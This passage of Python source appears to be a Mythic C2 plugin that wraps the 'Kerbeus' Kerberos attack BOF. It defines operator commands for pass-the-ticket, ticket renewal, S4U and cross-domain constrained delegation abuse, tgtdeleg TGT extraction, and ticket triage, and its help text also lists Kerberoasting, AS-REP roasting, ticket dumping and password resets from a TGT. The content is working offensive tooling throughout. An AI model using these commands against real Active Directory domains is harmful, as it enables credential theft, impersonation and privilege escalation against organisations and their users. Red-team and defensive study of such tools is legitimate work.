    version = 1
    author = "@RalfHacker"
    argument_class = KrbPttArguments

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        content = await self.load_bof(task)
        
        # Build command with - instead of /
        cmd_str = f"-ticket:{task.args.get_arg('ticket')}"
        if task.args.get_arg("luid"):
            cmd_str += f" -luid:{task.args.get_arg('luid')}"
            
        bof_args = [{"type": "char", "value": cmd_str}]
        
        task.args.add_arg("bof_file", content.hex())
        task.args.add_arg("bof_args", json.dumps(bof_args))
        
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName=self.cmd,
            DisplayParams=cmd_str.replace("-", " -")
        )

# ========== Ticket Purge ==========
class KrbPurgeArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="luid",
                cli_name="luid",
                display_name="Logon ID",
                type=ParameterType.String,
                description="Logon session ID to purge",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                args = self.command_line.split()
                for arg in args:
                    if arg.startswith("-luid:"):
                        self.add_arg("luid", arg.split(":", 1)[1])

class KrbPurgeCommand(KerbeusBaseCommand):
    cmd = "krb-purge"
    needs_admin = False
    help_cmd = "krb-purge [-luid:LOGONID]"
    description = "Purge Kerberos tickets from memory"
    version = 1
    author = "@RalfHacker"
    argument_class = KrbPurgeArguments

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        content = await self.load_bof(task)
        
        # Build command with - instead of /
        cmd_str = ""
        if task.args.get_arg("luid"):
            cmd_str = f"-luid:{task.args.get_arg('luid')}"
            
        bof_args = [{"type": "char", "value": cmd_str}]
        
        task.args.add_arg("bof_file", content.hex())
        task.args.add_arg("bof_args", json.dumps(bof_args))
        
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName=self.cmd,
            DisplayParams=cmd_str.replace("-", " -")
        )

# ========== Ticket Renewal ==========
class KrbRenewArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="ticket",
                cli_name="ticket",
                display_name="Ticket",
                type=ParameterType.String,
                description="Base64 encoded TGT",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="dc",
                cli_name="dc",
                display_name="Domain Controller",
                type=ParameterType.String,
                description="Domain controller to target",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="ptt",
                cli_name="ptt",
                display_name="Pass-the-Ticket",
                type=ParameterType.Boolean,
                description="Submit renewed ticket to session",
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                args = self.command_line.split()
                for arg in args:
                    if arg.startswith("-ticket:"):
                        self.add_arg("ticket", arg.split(":", 1)[1])
                    elif arg.startswith("-dc:"):
                        self.add_arg("dc", arg.split(":", 1)[1])
                    elif arg == "-ptt":
                        self.add_arg("ptt", True)

class KrbRenewCommand(KerbeusBaseCommand):
    cmd = "krb-renew"
    needs_admin = False
    help_cmd = "krb-renew -ticket:BASE64 [-dc:DC] [-ptt]"
    description = "Renew a Kerberos TGT"
    version = 1
    author = "@RalfHacker"
    argument_class = KrbRenewArguments

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        content = await self.load_bof(task)
        
        # Build command with - instead of /
        cmd_str = f"-ticket:{task.args.get_arg('ticket')}"
        if task.args.get_arg("dc"):
            cmd_str += f" -dc:{task.args.get_arg('dc')}"
        if task.args.get_arg("ptt"):
            cmd_str += " -ptt"
            
        bof_args = [{"type": "char", "value": cmd_str}]
        
        task.args.add_arg("bof_file", content.hex())
        task.args.add_arg("bof_args", json.dumps(bof_args))
        
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName=self.cmd,
            DisplayParams=cmd_str.replace("-", " -")
        )

# ========== S4U Delegation ==========
class KrbS4uArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="ticket",
                cli_name="ticket",
                display_name="Ticket",
                type=ParameterType.String,
                description="Base64 encoded TGT",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="service",
                cli_name="service",
                display_name="Service",
                type=ParameterType.String,
                description="Target SPN",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="impersonateuser",
                cli_name="impersonateuser",
                display_name="Impersonate User",
                type=ParameterType.String,
                description="User to impersonate",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                    group_name="Impersonation"
                )]
            ),
            CommandParameter(
                name="tgs",
                cli_name="tgs",
                display_name="TGS Ticket",
                type=ParameterType.String,
                description="Base64 encoded TGS for S4U2Self",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                    group_name="With TGS"
                )]
            ),
            CommandParameter(
                name="domain",
                cli_name="domain",
                display_name="Domain",
                type=ParameterType.String,
                description="Target domain",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="dc",
                cli_name="dc",
                display_name="Domain Controller",
                type=ParameterType.String,
                description="Domain controller to target",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="altservice",
                cli_name="altservice",
                display_name="Alternate Service",
                type=ParameterType.String,
                description="Alternate SPN for constrained delegation",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="ptt",
                cli_name="ptt",
                display_name="Pass-the-Ticket",
                type=ParameterType.Boolean,
                description="Submit ticket to current session",
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="nopac",
                cli_name="nopac",
                display_name="No PAC",
                type=ParameterType.Boolean,
                description="Request ticket without PAC",
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="opsec",
                cli_name="opsec",
                display_name="OPSEC",
                type=ParameterType.Boolean,
                description="OPSEC safe request",
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="self",
                cli_name="self",
                display_name="Self",
                type=ParameterType.Boolean,
                description="Request S4U2Self ticket",
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                args = self.command_line.split()
                for arg in args:
                    if arg.startswith("-ticket:"):
                        self.add_arg("ticket", arg.split(":", 1)[1])
                    elif arg.startswith("-service:"):
                        self.add_arg("service", arg.split(":", 1)[1])
                    elif arg.startswith("-impersonateuser:"):
                        self.add_arg("impersonateuser", arg.split(":", 1)[1])
                    elif arg.startswith("-tgs:"):
                        self.add_arg("tgs", arg.split(":", 1)[1])
                    elif arg.startswith("-domain:"):
                        self.add_arg("domain", arg.split(":", 1)[1])
                    elif arg.startswith("-dc:"):
                        self.add_arg("dc", arg.split(":", 1)[1])
                    elif arg.startswith("-altservice:"):
                        self.add_arg("altservice", arg.split(":", 1)[1])
                    elif arg == "-ptt":
                        self.add_arg("ptt", True)
                    elif arg == "-nopac":
                        self.add_arg("nopac", True)
                    elif arg == "-opsec":
                        self.add_arg("opsec", True)
                    elif arg == "-self":
                        self.add_arg("self", True)

class KrbS4uCommand(KerbeusBaseCommand):
    cmd = "krb-s4u"
    needs_admin = False
    help_cmd = "krb-s4u -ticket:BASE64 -service:SPN {-impersonateuser:USER | -tgs:BASE64} [-domain:DOMAIN] [-dc:DC] [-altservice:SERVICE] [-ptt] [-nopac] [-opsec] [-self]"
    description = "Perform S4U constrained delegation abuse"
    version = 1
    author = "@RalfHacker"
    argument_class = KrbS4uArguments

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        content = await self.load_bof(task)
        
        # Build command with - instead of /
        cmd_str = f"-ticket:{task.args.get_arg('ticket')} -service:{task.args.get_arg('service')}"
        
        if task.args.get_arg("impersonateuser"):
            cmd_str += f" -impersonateuser:{task.args.get_arg('impersonateuser')}"
        elif task.args.get_arg("tgs"):
            cmd_str += f" -tgs:{task.args.get_arg('tgs')}"
            
        if task.args.get_arg("domain"):
            cmd_str += f" -domain:{task.args.get_arg('domain')}"
        if task.args.get_arg("dc"):
            cmd_str += f" -dc:{task.args.get_arg('dc')}"
        if task.args.get_arg("altservice"):
            cmd_str += f" -altservice:{task.args.get_arg('altservice')}"
        if task.args.get_arg("ptt"):
            cmd_str += " -ptt"
        if task.args.get_arg("nopac"):
            cmd_str += " -nopac"
        if task.args.get_arg("opsec"):
            cmd_str += " -opsec"
        if task.args.get_arg("self"):
            cmd_str += " -self"
            
        bof_args = [{"type": "char", "value": cmd_str}]
        
        task.args.add_arg("bof_file", content.hex())
        task.args.add_arg("bof_args", json.dumps(bof_args))
        
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName=self.cmd,
            DisplayParams=cmd_str.replace("-", " -")
        )

# ========== Cross Domain S4U ==========
class KrbCrossS4uArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="ticket",
                cli_name="ticket",
                display_name="Ticket",
                type=ParameterType.String,
                description="Base64 encoded TGT",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="service",
                cli_name="service",
                display_name="Service",
                type=ParameterType.String,
                description="Target SPN",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="targetdomain",
                cli_name="targetdomain",
                display_name="Target Domain",
                type=ParameterType.String,
                description="Target domain for cross-realm",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="targetdc",
                cli_name="targetdc",
                display_name="Target DC",
                type=ParameterType.String,
                description="Target domain controller",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="impersonateuser",
                cli_name="impersonateuser",
                display_name="Impersonate User",
                type=ParameterType.String,
                description="User to impersonate",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                    group_name="Impersonation"
                )]
            ),
            CommandParameter(
                name="tgs",
                cli_name="tgs",
                display_name="TGS Ticket",
                type=ParameterType.String,
                description="Base64 encoded TGS for S4U2Self",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                    group_name="With TGS"
                )]
            ),
            CommandParameter(
                name="domain",
                cli_name="domain",
                display_name="Domain",
                type=ParameterType.String,
                description="Source domain",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="dc",
                cli_name="dc",
                display_name="Domain Controller",
                type=ParameterType.String,
                description="Source domain controller",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="altservice",
                cli_name="altservice",
                display_name="Alternate Service",
                type=ParameterType.String,
                description="Alternate SPN for constrained delegation",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="nopac",
                cli_name="nopac",
                display_name="No PAC",
                type=ParameterType.Boolean,
                description="Request ticket without PAC",
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="self",
                cli_name="self",
                display_name="Self",
                type=ParameterType.Boolean,
                description="Request S4U2Self ticket",
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                args = self.command_line.split()
                for arg in args:
                    if arg.startswith("-ticket:"):
                        self.add_arg("ticket", arg.split(":", 1)[1])
                    elif arg.startswith("-service:"):
                        self.add_arg("service", arg.split(":", 1)[1])
                    elif arg.startswith("-targetdomain:"):
                        self.add_arg("targetdomain", arg.split(":", 1)[1])
                    elif arg.startswith("-targetdc:"):
                        self.add_arg("targetdc", arg.split(":", 1)[1])
                    elif arg.startswith("-impersonateuser:"):
                        self.add_arg("impersonateuser", arg.split(":", 1)[1])
                    elif arg.startswith("-tgs:"):
                        self.add_arg("tgs", arg.split(":", 1)[1])
                    elif arg.startswith("-domain:"):
                        self.add_arg("domain", arg.split(":", 1)[1])
                    elif arg.startswith("-dc:"):
                        self.add_arg("dc", arg.split(":", 1)[1])
                    elif arg.startswith("-altservice:"):
                        self.add_arg("altservice", arg.split(":", 1)[1])
                    elif arg == "-nopac":
                        self.add_arg("nopac", True)
                    elif arg == "-self":
                        self.add_arg("self", True)

class KrbCrossS4uCommand(KerbeusBaseCommand):
    cmd = "krb-cross_s4u"
    needs_admin = False
    help_cmd = "krb-cross_s4u -ticket:BASE64 -service:SPN -targetdomain:DOMAIN -targetdc:DC {-impersonateuser:USER | -tgs:BASE64} [-domain:DOMAIN] [-dc:DC] [-altservice:SERVICE] [-nopac] [-self]"
    description = "Perform S4U constrained delegation abuse across domains"
    version = 1
    author = "@RalfHacker"
    argument_class = KrbCrossS4uArguments

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        content = await self.load_bof(task)
        
        # Build command with - instead of /
        cmd_str = (f"-ticket:{task.args.get_arg('ticket')} "
                  f"-service:{task.args.get_arg('service')} "
                  f"-targetdomain:{task.args.get_arg('targetdomain')} "
                  f"-targetdc:{task.args.get_arg('targetdc')}")
        
        if task.args.get_arg("impersonateuser"):
            cmd_str += f" -impersonateuser:{task.args.get_arg('impersonateuser')}"
        elif task.args.get_arg("tgs"):
            cmd_str += f" -tgs:{task.args.get_arg('tgs')}"
            
        if task.args.get_arg("domain"):
            cmd_str += f" -domain:{task.args.get_arg('domain')}"
        if task.args.get_arg("dc"):
            cmd_str += f" -dc:{task.args.get_arg('dc')}"
        if task.args.get_arg("altservice"):
            cmd_str += f" -altservice:{task.args.get_arg('altservice')}"
        if task.args.get_arg("nopac"):
            cmd_str += " -nopac"
        if task.args.get_arg("self"):
            cmd_str += " -self"
            
        bof_args = [{"type": "char", "value": cmd_str}]
        
        task.args.add_arg("bof_file", content.hex())
        task.args.add_arg("bof_args", json.dumps(bof_args))
        
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName=self.cmd,
            DisplayParams=cmd_str.replace("-", " -")
        )

# ========== TGT Delegation ==========
class KrbTgtdelegArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="target",
                cli_name="target",
                display_name="Target SPN",
                type=ParameterType.String,
                description="Target SPN for delegation",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                args = self.command_line.split()
                for arg in args:
                    if arg.startswith("-target:"):
                        self.add_arg("target", arg.split(":", 1)[1])

class KrbTgtdelegCommand(KerbeusBaseCommand):
    cmd = "krb-tgtdeleg"
    needs_admin = False
    help_cmd = "krb-tgtdeleg [-target:SPN]"
    description = "Retrieve a usable TGT for the current user without elevation by abusing the Kerberos GSS-API"
    version = 1
    author = "@RalfHacker"
    argument_class = KrbTgtdelegArguments

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        content = await self.load_bof(task)
        
        # Build command with - instead of /
        cmd_str = ""
        if task.args.get_arg("target"):
            cmd_str = f"-target:{task.args.get_arg('target')}"
            
        bof_args = [{"type": "char", "value": cmd_str}]
        
        task.args.add_arg("bof_file", content.hex())
        task.args.add_arg("bof_args", json.dumps(bof_args))
        
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName=self.cmd,
            DisplayParams=cmd_str.replace("-", " -")
        )

# ========== Ticket Triage ==========
class KrbTriageArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="luid",
                cli_name="luid",
                display_name="Logon ID",
                type=ParameterType.String,
                description="Logon session ID to target",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="user",
                cli_name="user",
                display_name="User",
                type=ParameterType.String,
                description="Filter by username",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="service",
                cli_name="service",
                display_name="Service",
                type=ParameterType.String,
                description="Filter by service SPN",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="client",
                cli_name="client",
                display_name="Client",
                type=ParameterType.String,
                description="Filter by client name",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                args = self.command_line.split()
                for arg in args:
                    if arg.startswith("-luid:"):
                        self.add_arg("luid", arg.split(":", 1)[1])
                    elif arg.startswith("-user:"):
                        self.add_arg("user", arg.split(":", 1)[1])
                    elif arg.startswith("-service:"):
                        self.add_arg("service", arg.split(":", 1)[1])
                    elif arg.startswith("-client:"):
                        self.add_arg("client", arg.split(":", 1)[1])

class KrbTriageCommand(KerbeusBaseCommand):
    cmd = "krb-triage"
    needs_admin = False
    help_cmd = "krb-triage [-luid:LOGINID] [-user:USER] [-service:SERVICE] [-client:CLIENT]"
    description = "List Kerberos tickets in table format"
    version = 1
    author = "@RalfHacker"
    argument_class = KrbTriageArguments

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        content = await self.load_bof(task)
        
        # Build command with - instead of /
        cmd_str = ""
        if task.args.get_arg("luid"):
            cmd_str += f" -luid:{task.args.get_arg('luid')}"
        if task.args.get_arg("user"):
            cmd_str += f" -user:{task.args.get_arg('user')}"
        if task.args.get_arg("service"):
            cmd_str += f" -service:{task.args.get_arg('service')}"
        if task.args.get_arg("client"):
            cmd_str += f" -client:{task.args.get_arg('client')}"
            
        bof_args = [{"type": "char", "value": cmd_str.strip()}]
        
        task.args.add_arg("bof_file", content.hex())
        task.args.add_arg("bof_args", json.dumps(bof_args))
        
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName=self.cmd,
            DisplayParams=cmd_str.replace("-", " -").strip()
        )

# ========== Help Command ==========
class KerbeusHelpCommand(CommandBase):
    cmd = "kerbeus"
    needs_admin = False
    help_cmd = "kerbeus"
    description = "Show Kerbeus BOF help menu"
    version = 1
    author = "@RalfHacker"
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        help_text = """
Kerbeus BOF by HackerRalf help:

Ticket requests and renewals:

    Retrieve a TGT
        krb-asktgt -user:USER -password:PASSWORD [-domain:DOMAIN] [-dc:DC] [-enctype:{rc4|aes256}] [-ptt] [-nopac] [-opsec]
        krb-asktgt -user:USER -aes256:HASH [-domain:DOMAIN] [-dc:DC] [-ptt] [-nopac] [-opsec]
        krb-asktgt -user:USER -rc4:HASH [-domain:DOMAIN] [-dc:DC] [-ptt] [-nopac]
        krb-asktgt -user:USER -nopreauth [-domain:DOMAIN] [-dc:DC] [-ptt]

    Retrieve a TGS
        krb-asktgs -ticket:BASE64 -service:SPN1,SPN2,... [-domain:DOMAIN] [-dc:DC] [-tgs:BASE64] [-targetdomain:DOMAIN] [-targetuser:USER] [-enctype:{rc4|aes256}] [-ptt] [-keylist] [-u2u] [-opsec]

    Renew a TGT
        krb-renew -ticket:BASE64 [-dc:DC] [-ptt]

Constrained delegation abuse:

    Perform S4U constrained delegation abuse:
        krb-s4u -ticket:BASE64 -service:SPN {-impersonateuser:USER | -tgs:BASE64} [-domain:DOMAIN] [-dc:DC] [-altservice:SERVICE] [-ptt] [-nopac] [-opsec] [-self]

    Perform S4U constrained delegation abuse across domains:
        krb-cross_s4u -ticket:BASE64 -service:SPN -targetdomain:DOMAIN -targetdc:DC {-impersonateuser:USER | -tgs:BASE64} [-domain:DOMAIN] [-dc:DC] [-altservice:SERVICE] [-nopac] [-self]

Ticket management:

    Submit a TGT
        krb-ptt -ticket:BASE64 [-luid:LOGONID]

    Purge tickets
        krb-purge [-luid:LOGONID]

    Parse and describe a ticket
        krb-describe -ticket:BASE64

    Triage tickets
        krb-triage [-luid:LOGINID] [-user:USER] [-service:SERVICE] [-client:CLIENT]

    List tickets
        krb-klist [-luid:LOGINID] [-user:USER] [-service:SERVICE] [-client:CLIENT]

    Dump tickets
        krb-dump [-luid:LOGINID] [-user:USER] [-service:SERVICE] [-client:CLIENT]

    Retrieve a usable TGT for the current user without elevation by abusing the Kerberos GSS-API
        krb-tgtdeleg [-target:SPN]

Roasting:

    Perform Kerberoasting:
        krb-kerberoasting -spn:SPN [-nopreauth:USER] [-dc:DC] [-domain:DOMAIN]
        krb-kerberoasting -spn:SPN -ticket:BASE64 [-dc:DC]

    Perform AS-REP roasting:
        krb-asreproasting -user:USER [-dc:DC] [-domain:DOMAIN] [-aes]

Miscellaneous:

    Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1 hashes:
        krb-hash -password:PASSWORD [-user:USER] [-domain:DOMAIN]

    Reset a user's password from a supplied TGT
        krb-changepw -ticket:BASE64 -new:PASSWORD [-dc:DC] [-targetuser:USER] [-targetdomain:DOMAIN]
        """
        
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=task.Task.ID,
            Response=help_text
        ))
        
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            Completed=True
        )
  
    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)